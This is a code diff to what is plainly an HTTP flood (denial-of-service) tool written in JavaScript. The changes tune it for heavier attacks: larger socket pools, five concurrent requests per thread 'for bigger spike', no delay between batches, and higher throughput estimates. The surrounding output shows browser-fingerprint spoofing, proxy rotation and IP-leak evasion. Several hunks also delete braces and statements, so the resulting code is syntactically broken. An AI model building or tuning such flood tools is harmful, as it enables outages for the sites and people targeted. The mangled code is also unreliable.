@@ -226,18 +226,8 @@ function createTLSAgent(profile, proxyUrl = null) {
         sessionTimeout: 300,
         keepAlive: true,
         keepAliveMsecs: 1000,
-        maxSockets: 256,
-        maxFreeSockets: 10,
-        timeout: 5000,
-        scheduling: 'fifo'
-    };
-    
-    if (profile.tls.sigalgs) {
-        tlsOptions.sigalgs = profile.tls.sigalgs;
-    }
-    
-    let agent;
-    if (proxyUrl) {
+            maxSockets: 1024,
+            maxFreeSockets: 512,
         agent = proxyUrl.startsWith('https') 
             ? new HttpsProxyAgent(proxyUrl, tlsOptions)
             : new HttpProxyAgent(proxyUrl);
@@ -613,10 +603,10 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: OPTIMIZED (2 concurrent/thread, 15ms delay)`);
+        console.log(`[*] Mode: BURST (5 concurrent/thread, 0ms delay)`);
         console.log(`[*] JA3: Valid browser fingerprints + randomization`);
         console.log(`[*] Protocol: HTTP/1.1 (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)`);
-        console.log(`[*] Connection: 256 socket pool + Keep-Alive`);
+        console.log(`[*] Connection: ${config.proxies.length > 0 ? '2048' : '1024'} socket pool + Keep-Alive`);
         console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
         if (config.proxies.length > 0) {
             console.log(`[*] Proxy: Simple rotation after 3 fails`);
@@ -626,8 +616,8 @@ class HTTPFlood {
             }
         }
         
-        const baseRPS = config.proxies.length > 0 ? 100 : 200;
-        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 25000 : 50000));
+        const baseRPS = config.proxies.length > 0 ? 250 : 500;
+        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 50000 : 100000));
         console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()} req/s`);
         
         if (this.threads > 100) {
@@ -668,7 +658,7 @@ class HTTPFlood {
         const profile = getRandomElement(BROWSER_PROFILES);
         const useProxy = config.proxies.length > 0;
         const isHttpsTarget = this.url.startsWith('https://');
-        const concurrency = 2; // 2 concurrent requests per thread
+        const concurrency = 5; // 5 concurrent requests per thread for bigger spike
         
         const endTime = Date.now() + this.duration * 1000;
         
@@ -704,12 +694,8 @@ class HTTPFlood {
                             rejectUnauthorized: false,
                             keepAlive: true,
                             keepAliveMsecs: 1000,
-                            maxSockets: 512,
-                            maxFreeSockets: 256,
-                            timeout: 10000
-                        };
-                        
-                        cachedAgent = isHttpsTarget
+                        maxSockets: 2048,
+                        maxFreeSockets: 1024,
                             ? new HttpsProxyAgent(proxy, agentOptions)
                             : new HttpProxyAgent(proxy, agentOptions);
                         lastProxyIndex = proxyIndex;
@@ -809,8 +795,8 @@ class HTTPFlood {
             
             await Promise.all(batch);
             
-            // Small delay between batches (15ms instead of 50ms)
-            await new Promise(resolve => setTimeout(resolve, 15));
+            // No delay for maximum speed burst (removed 15ms delay)
+            // await new Promise(resolve => setTimeout(resolve, 15));
             
             // Check RPS limit if enabled
             if (config.maxRPS && useProxy) {
